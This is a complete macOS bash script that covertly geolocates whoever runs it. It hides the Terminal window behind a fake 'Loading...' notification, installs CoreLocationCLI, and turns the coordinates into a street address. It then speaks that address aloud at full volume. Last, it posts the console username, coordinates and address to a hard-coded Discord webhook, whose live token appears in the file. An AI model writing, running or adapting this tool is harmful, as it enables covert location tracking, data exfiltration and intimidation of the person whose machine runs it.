#!/bin/bash
# This script retrieves your coordinates using CoreLocationCLI,
# reverse-geocodes them to obtain a precise address via Nominatim,
# sets the system volume to maximum, uses text-to-speech to announce your location,
# and sends the gathered information (timestamp, username, coordinates, address, and message)
# to a Discord webhook.
#
# Requirements:
# - macOS
# - curl, python3, osascript, say (typically available by default)
#
# Usage:
#   ./location_script.sh "Your custom message here"
# If no message is provided, a default message is used.

# --- Hide Terminal and display a "Loading..." notification ---
osascript -e 'tell application "Terminal" to set visible of front window to false'
osascript -e 'display notification "Loading..." with title "Location Script"'

# --- Check for Homebrew and install if not found ---
if ! command -v brew &>/dev/null; then
    echo "Homebrew not found. Installing Homebrew..."
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
    # Update PATH for typical Homebrew locations
    if [ -d "/opt/homebrew/bin" ]; then
        export PATH="/opt/homebrew/bin:$PATH"
    elif [ -d "/usr/local/bin" ]; then
        export PATH="/usr/local/bin:$PATH"
    fi
fi

if ! command -v brew &>/dev/null; then
    echo "Failed to install Homebrew. Exiting."
    exit 1
fi

# --- Check for CoreLocationCLI and install if necessary ---
if ! command -v CoreLocationCLI &>/dev/null; then
    echo "CoreLocationCLI not found. Installing CoreLocationCLI via Homebrew..."
    brew install corelocationcli
fi

if ! command -v CoreLocationCLI &>/dev/null; then
    echo "CoreLocationCLI is still not installed. Please install it manually using: brew install corelocationcli"
    exit 1
fi

# --- Retrieve geolocation using CoreLocationCLI with retries ---
attempt=0
max_attempts=5
location_output=""
lat=""
lon=""

while [ $attempt -lt $max_attempts ]; do
    location_output=$(CoreLocationCLI)
    lat=$(echo "$location_output" | grep -i "latitude:" | awk '{print $2}' | tr -d ',')
    lon=$(echo "$location_output" | grep -i "longitude:" | awk '{print $2}')
    if [ -n "$lat" ] && [ -n "$lon" ]; then
        break
    fi
    attempt=$((attempt + 1))
    sleep 5
done

if [ -z "$lat" ] || [ -z "$lon" ]; then
    echo "Failed to retrieve coordinates after $max_attempts attempts."
    osascript -e 'display notification "Failed to retrieve coordinates." with title "Location Script Error"'
    exit 1
fi

echo "Coordinates: Latitude $lat, Longitude $lon"

# --- Reverse geocode the coordinates using Nominatim ---
reverse_json=$(curl -s "https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1")
address=$(echo "$reverse_json" | python3 -c "import sys, json; data=json.load(sys.stdin); print(data.get('display_name','Address not found'))")
echo "Precise address: $address"

# --- Open the location in Google Maps ---
map_url="https://www.google.com/maps/search/?api=1&query=${lat},${lon}"
echo "Opening map: $map_url"
open "$map_url"

# --- Set system volume to maximum ---
osascript -e 'set volume output volume 100'

# --- Determine the message to speak ---
if [ -n "$1" ]; then
    message="$1"
else
    message="Your precise location is: $address."
fi

echo "Speaking message: $message"
say "$message"

# --- Get current username and timestamp for logging ---
username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')
timestamp=$(date)

# --- Prepare the capture data ---
capture="Timestamp: ${timestamp}\nUsername: ${username}\nLatitude: ${lat}\nLongitude: ${lon}\nAddress: ${address}\nMessage: ${message}"

# Save the data to a temporary file
echo -e "$capture" > pass.txt

# --- Send data to Discord webhook ---
DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B"
payload=$(python3 -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < pass.txt)
curl -X POST -H "Content-Type: application/json" -d "$payload" "$DISCORD_WEBHOOK"
rm pass.txt
